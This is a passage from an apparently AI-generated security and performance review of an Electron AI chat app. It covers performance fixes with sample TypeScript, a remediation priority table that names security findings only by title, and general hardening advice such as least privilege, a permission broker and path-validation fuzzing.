**Location:** `src/main/ipc/handlers.ts:668` (chat:token), `src/renderer/src/components/chat/InputBar.tsx:185` (onToken)  
**Severity:** Warning  
**Description:** Each streaming token is sent as a separate IPC message (`win.webContents.send('chat:token', chunk)`). For a 2000-token response, this is 2000 IPC round trips. IPC is relatively expensive in Electron (involves serialization, context switching, and V8 inter-process communication). For high-throughput streaming, this can become a bottleneck.

**Rationale:** IPC overhead per message is small (~0.1-0.5ms), but multiplied by thousands of tokens, it adds up to 200-1000ms of cumulative overhead. It also causes the renderer to re-render on every token (PERF-005).

**Remediation:** Buffer tokens in the main process and flush them in batches:

```typescript
// In handlers.ts doChatStream:
let tokenBuffer = '';
let tokenFlushTimeout: ReturnType<typeof setTimeout> | null = null;

function flushTokens() {
  if (tokenBuffer) {
    win.webContents.send('chat:tokens', tokenBuffer); // batched
    tokenBuffer = '';
  }
  tokenFlushTimeout = null;
}

for await (const chunk of stream) {
  if (typeof chunk === 'string') {
    tokenBuffer += chunk;
    if (!tokenFlushTimeout) {
      tokenFlushTimeout = setTimeout(flushTokens, 16); // ~60fps batching
    }
  }
}
flushTokens(); // flush remaining
```

On the renderer side, update `appendToken` to handle batches:

```typescript
// In chat.ts store
appendTokens: (tokens: string) => {
  set(s => {
    const msgs = [...s.messages];
    const last = msgs[msgs.length - 1];
    if (last && last.role === 'assistant') {
      msgs[msgs.length - 1] = { ...last, content: last.content + tokens };
    } else {
      msgs.push({ id: genId(), role: 'assistant', content: tokens, timestamp: Date.now(), kind: 'assistant_message' });
    }
    if (s.threadId) debouncedSave(s.threadId, msgs);
    return { messages: msgs };
  });
}
```

#### PERF-005: AnimatePresence `popLayout` on Entire Message List is Expensive
**Location:** `src/renderer/src/components/chat/ChatPanel.tsx:508`  
**Severity:** Warning  
**Description:** `AnimatePresence mode="popLayout"` on the message list container means Framer Motion must measure every exiting element's bounding box and compute layout animations for all messages. When messages are added or removed, this causes a layout recalculation of the entire list. For 100+ messages, this is expensive.

**Remediation:** Remove `AnimatePresence` or use `mode="wait"` for the list container. Add enter animations only for the last message (newly added), not for the entire list. Use `layout={false}` on individual message items to prevent layout animation calculations.

```tsx
// Instead of AnimatePresence for the whole list:
{messages.map((msg, i) => (
  <motion.div
    key={msg.id}
    initial={i === messages.length - 1 ? { opacity: 0, y: 10 } : false}
    animate={{ opacity: 1, y: 0 }}
    transition={{ duration: 0.2 }}
    layout={false}  // disable layout animations
  >
    <MessageRow message={msg} />
  </motion.div>
))}
```

#### PERF-006: Screenshot Memory Duplication and Base64 Storage
**Location:** `src/renderer/src/components/chat/InputBar.tsx:718-722`  
**Severity:** Warning  
**Description:** When a screenshot is captured:
1. Main process returns a base64 string (full PNG)
2. Renderer converts base64 to Uint8Array (copy 1)
3. Creates a Blob (copy 2)
4. Creates a File (copy 3)
5. Stores the base64 string in the message content (copy 4)
6. Messages are persisted to disk (copy 5)

A 4K screenshot PNG can be 10-20MB. After duplication, this becomes 50-100MB in memory and disk per screenshot. Screenshots are also stored in message history forever, causing unbounded disk growth.

**Remediation:**
1. Store screenshots as files on disk (in the app's userData directory) and reference them by path in messages.
2. Compress/resize screenshots before storage (e.g., max 1920px width, JPEG quality 80%).
3. Implement a cleanup policy: delete screenshot files older than N days or when the thread is deleted.

```typescript
// In main process (handlers.ts):
async function captureScreenshot(): Promise<string> {
  const base64 = await captureScreenshotRaw();
  const screenshotId = randomUUID();
  const screenshotPath = join(getScreenshotsDir(), `${screenshotId}.png`);
  // Save compressed version
  await saveCompressedScreenshot(base64, screenshotPath, { maxWidth: 1920, quality: 80 });
  return screenshotId; // return ID, not base64
}
```

#### PERF-007: No Code Splitting for Heavy Panels
**Location:** `src/renderer/src/components/layout/AppShell.tsx`  
**Severity:** Warning  
**Description:** Heavy components like `SkillsPanel`, `FilePanel`, `MemoryPanel`, `SettingsModal`, `OnboardingModal`, `GlobalSearch`, and `CommandPalette` are imported eagerly at the top of `AppShell.tsx`. They are all bundled into the main renderer chunk even though most are rarely used simultaneously. This increases initial bundle size and startup time.

**Remediation:** Use React.lazy and dynamic imports for panels:

```tsx
const SkillsPanel = lazy(() => import('../skills/SkillsPanel'));
const FilePanel = lazy(() => import('../files/FilePanel'));
const MemoryPanel = lazy(() => import('../memory/MemoryPanel'));
const SettingsModal = lazy(() => import('../settings/SettingsModal'));
// ... etc

// Wrap with Suspense:
<Suspense fallback={<div className="p-4">Loading...</div>}>
  {skillsPanelOpen && <SkillsPanel onClose={...} />}
</Suspense>
```

Also configure Vite to split chunks:

```typescript
// electron.vite.config.ts
renderer: {
  build: {
    rollupOptions: {
      output: {
        manualChunks: {
          'react-vendor': ['react', 'react-dom'],
          'markdown': ['react-markdown', 'remark-gfm', 'highlight.js'],
          'mermaid': ['mermaid'],
          'framer': ['framer-motion'],
          'ui': ['@radix-ui/react-context-menu', '@radix-ui/react-dialog', /* ... */],
        }
      }
    }
  }
}
```

#### PERF-008: Zustand Stores Trigger Unnecessary Re-renders
**Location:** `src/renderer/src/components/chat/Message.tsx:363-371`, `src/renderer/src/components/layout/AppShell.tsx:65-68`  
**Severity:** Warning  
**Description:** Components subscribe to Zustand stores without using shallow comparison or fine-grained selectors. For example, `MessageRow` subscribes to `useChatStore`, `useSettingsStore`, and `useWorkspaceStore` to get individual actions. While Zustand supports selector-based subscriptions, the current pattern is partially correct but could be improved.

More importantly, `AppShell.tsx` subscribes to `useWorkspaceStore` to get `workspaces`, which causes a re-render of the entire app shell whenever the workspace list changes (even if the change doesn't affect the visible UI).

**Remediation:** Use Zustand's shallow comparison for object/array selections and split stores to minimize subscription scope:

```typescript
// Message.tsx — already partially correct:
const editMessage = useChatStore((state) => state.editMessage);  // Good: only re-renders if editMessage changes

// AppShell.tsx — avoid subscribing to entire stores:
// Instead of: const { workspaces } = useWorkspaceStore();
// Use: const workspaceCount = useWorkspaceStore((s) => s.workspaces.length);
```

Consider splitting the monolithic stores into smaller, focused stores (e.g., `useChatMessagesStore`, `useChatUIStore`) to reduce re-render blast radius.

#### PERF-009: Large Bundle Dependencies Without Tree-Shaking Verification
**Location:** `package.json`  
**Severity:** Warning  
**Description:** The bundle includes `mermaid` (~2.5MB+), `framer-motion` (~150KB), `react-markdown` + `remark-gfm` (~200KB), `highlight.js` (~150KB with all languages), and `lucide-react` (tree-shaken but large icon library). If tree-shaking is not working correctly, the bundle could exceed 5MB.

**Remediation:**
1. Verify tree-shaking is working by running `npm run build` and checking `out/renderer/assets/*.js` sizes.
2. Replace `highlight.js` with a lighter alternative like `shiki` (on-demand loading) or `prismjs` with only needed languages.
3. Lazy-load Mermaid only when needed (artifact rendering).
4. Consider replacing `lucide-react` with individual SVG imports or `react-icons` with cherry-picked icons.

---

## Part C — Remediation Priority Matrix

| ID | Finding | Severity | Effort | Priority |
|----|---------|----------|--------|----------|
| SEC-003 | Shell whitelist bypass | Critical | Low | **P0 — Fix immediately** |
| SEC-002 | IPC file tools no path validation | Critical | Low | **P0 — Fix immediately** |
| SEC-001 | sandbox: false | Critical | Medium | **P0 — Fix immediately** |
| SEC-004 | SVG/Mermaid XSS | Critical | Low | **P0 — Fix immediately** |
| SEC-006 | MCP arbitrary command spawn | Critical | Medium | **P0 — Fix immediately** |
| SEC-007 | Desktop IPC bypasses desktopEnabled | Critical | Low | **P0 — Fix immediately** |
| SEC-008 | API key exfiltration via fetchModels | Critical | Low | **P0 — Fix immediately** |
| SEC-005 | iframe sandbox too permissive | Critical | Medium | **P1 — Fix before release** |
| PERF-001 | No virtual scrolling | Critical | Medium | **P1 — Fix before release** |
| PERF-002 | InputBar listener leak | Critical | Low | **P1 — Fix before release** |
| PERF-003 | Synchronous disk writes | Critical | Low | **P1 — Fix before release** |
| SEC-009 | approvalMode not enforced | Warning | Medium | **P2 — Next sprint** |
| SEC-010 | isPathAllowed symlink issues | Warning | Medium | **P2 — Next sprint** |
| SEC-011 | Error message leakage | Warning | Low | **P2 — Next sprint** |
| SEC-012 | AppleScript injection | Warning | Low | **P2 — Next sprint** |
| SEC-013 | SSRF in fetchModels | Warning | Low | **P2 — Next sprint** |
| PERF-004 | IPC token overhead | Warning | Low | **P2 — Next sprint** |
| PERF-005 | AnimatePresence popLayout | Warning | Low | **P3 — Backlog** |
| PERF-006 | Screenshot memory bloat | Warning | Medium | **P3 — Backlog** |
| PERF-007 | No code splitting | Warning | Medium | **P3 — Backlog** |
| PERF-008 | Zustand re-renders | Warning | Low | **P3 — Backlog** |
| PERF-009 | Bundle size | Warning | Low | **P3 — Backlog** |

---

## Part D — General Architecture Recommendations

### 1. Adopt a Principle of Least Privilege
The renderer should be treated as untrusted. Move ALL sensitive operations (file I/O, shell execution, API key access, network requests with credentials) to the main process. The renderer should only have access to:
- Chat message display and input
- UI state management
- Read-only workspace metadata (no file contents)

### 2. Implement a Permission Broker
Create a centralized `PermissionBroker` in the main process that:
- Logs all tool executions with user/workspace context
- Enforces `approvalMode` settings
- Shows native confirmation dialogs for destructive operations
- Rate-limits tool execution to prevent abuse

### 3. Secure the Preload API Surface
Audit `preload/index.ts` and remove any IPC channels that expose sensitive data or capabilities. The preload should be a minimal, read-only bridge for UI features. For example:
- Remove `tools:readFile`, `tools:writeFile`, `tools:listDirectory`, `tools:applyPatch`
- Remove `settings:getApiKey`
- Remove `settings:testProvider` (or restrict to validated URLs)
- Add `workspace:readFile` that only works within the workspace boundary

### 4. Add Security Headers and CSP
Set a strict Content Security Policy programmatically on the `webContents.session`. This prevents inline script injection even if the HTML meta tag is bypassed.

### 5. Implement Fuzzing for Path Validation
Write unit tests that fuzz `isPathAllowed` with paths containing:
- `..` sequences
- Symlinks (use `fs.symlink` in tests)
- Null bytes (`\0`)
- Unicode normalization attacks (e.g., `é` vs `e\u0301`)
- Case variations on Windows/macOS

### 6. Add Logging and Audit Trail
Log all tool executions to a tamper-resistant log file (or append-only log) with:
- Timestamp
- User/workspace/thread ID
- Tool name and sanitized arguments
- Success/failure status
- Source (AI vs. user direct action)

This helps detect and investigate abuse, and provides accountability for automated actions.

---

*Report generated by Security_Performance_Reviewer sub-agent.*
*All code references verified against commit e8b67fa (main branch).*
